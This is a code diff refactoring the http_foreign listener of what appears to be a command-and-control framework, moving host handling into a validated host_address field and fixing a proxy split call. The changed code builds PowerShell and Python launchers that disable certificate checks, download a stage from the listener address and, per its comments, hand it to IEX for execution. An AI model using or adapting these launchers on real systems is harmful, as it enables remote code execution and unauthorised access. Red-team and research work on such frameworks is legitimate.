@@ -108,6 +108,7 @@ class Listener:
         self.thread = None
 
         # optional/specific for this module
+        self.host_address = None
         self.app = None
         self.uris = [
             a.strip("/")
@@ -140,6 +141,11 @@ class Listener:
             for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
         ]
 
+        self.host_address, err = self.mainMenu.listenersv2.validate_listener_address(
+            self.options
+        )
+        if err:
+            return False, err
         return True, None
 
     def generate_launcher(
@@ -167,22 +173,15 @@ class Listener:
             )
             return None
 
-        active_listener = self
-        # extract the set options for this instantiated listener
-        listenerOptions = active_listener.options
-
-        host = listenerOptions["Host"]["Value"]
-        launcher = listenerOptions["Launcher"]["Value"]
-        stagingKey = listenerOptions["StagingKey"]["Value"]
-        profile = listenerOptions["DefaultProfile"]["Value"]
+        launcher = self.options["Launcher"]["Value"]
+        stagingKey = self.options["StagingKey"]["Value"]
+        profile = self.options["DefaultProfile"]["Value"]
         uris = list(profile.split("|")[0].split(","))
         stage0 = random.choice(uris)
         customHeaders = profile.split("|")[2:]
-        cookie = listenerOptions["Cookie"]["Value"]
+        cookie = self.options["Cookie"]["Value"]
 
-        if language.startswith("po"):
-            # PowerShell
-
+        if language == "powershell":
             stager = '$ErrorActionPreference = "SilentlyContinue";'
             if safe_checks.lower() == "true":
                 stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
@@ -194,11 +193,11 @@ class Listener:
             stager += "$wc=New-Object System.Net.WebClient;"
 
             if user_agent.lower() == "default":
-                profile = listenerOptions["DefaultProfile"]["Value"]
+                profile = self.options["DefaultProfile"]["Value"]
                 user_agent = profile.split("|")[1]
             stager += f"$u='{user_agent}';"
 
-            if "https" in host:
+            if "https" in self.host_address:
                 # allow for self-signed certificates for https connections
                 stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
@@ -241,14 +240,12 @@ class Listener:
             stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
 
             # Use routingpacket from foreign listener
-            b64RoutingPacket = listenerOptions["RoutingPacket"]["Value"]
+            b64RoutingPacket = self.options["RoutingPacket"]["Value"]
 
             # add the routing packet to a cookie
             stager += f'$wc.Headers.Add("Cookie","{cookie}={b64RoutingPacket}");'
 
-            stager += (
-                f"$ser= {helpers.obfuscate_call_home_address(host)};$t='{stage0}';"
-            )
+            stager += f"$ser= {helpers.obfuscate_call_home_address(self.host_address)};$t='{stage0}';"
             stager += "$data=$wc.DownloadData($ser+$t);"
 
             # decode everything and kick it over to IEX to kick off execution
@@ -274,7 +271,7 @@ class Listener:
 
         if language in ["python", "ironpython"]:
             launcherBase = "import sys;"
-            if "https" in host:
+            if "https" in self.host_address:
                 # monkey patch ssl woohooo
                 launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
 
@@ -286,18 +283,18 @@ class Listener:
                 log.error(p, exc_info=True)
 
             if user_agent.lower() == "default":
-                profile = listenerOptions["DefaultProfile"]["Value"]
+                profile = self.options["DefaultProfile"]["Value"]
                 user_agent = profile.split("|")[1]
 
             launcherBase += dedent(
                 f"""
                 o=__import__({{2:'urllib2',3:'urllib.request'}}[sys.version_info[0]],fromlist=['build_opener']).build_opener();
                 UA='{user_agent}';
-                server='{host}';t='{stage0}';
+                server='{self.host_address}';t='{stage0}';
                 """
             )
 
-            b64RoutingPacket = listenerOptions["RoutingPacket"]["Value"]
+            b64RoutingPacket = self.options["RoutingPacket"]["Value"]
 
             # add the routing packet to a cookie
             launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "{cookie}={b64RoutingPacket}")];\n'
@@ -307,7 +304,7 @@ class Listener:
                 if proxy.lower() == "default":
                     launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                 else:
-                    proto = proxy.Split(":")[0]
+                    proto = proxy.split(":")[0]
                     launcherBase += (
                         "proxy = urllib.request.ProxyHandler({'"
                         + proto
@@ -396,8 +393,6 @@ class Listener:
 
         This is so agents can easily be dynamically updated for the new listener.
         """
-        host = listenerOptions["Host"]["Value"]
-
         if not language:
             log.error("listeners/http_foreign generate_comms(): no language specified!")
             return None
@@ -413,7 +408,7 @@ class Listener:
 
             template_options = {
                 "session_cookie": self.session_cookie,
-                "host": host,
+                "host": self.host_address,
             }
 
             return template.render(template_options)
@@ -428,7 +423,7 @@ class Listener:
 
             template_options = {
                 "session_cookie": self.session_cookie,
-                "host": host,
+                "host": self.host_address,
             }
 
             return template.render(template_options)
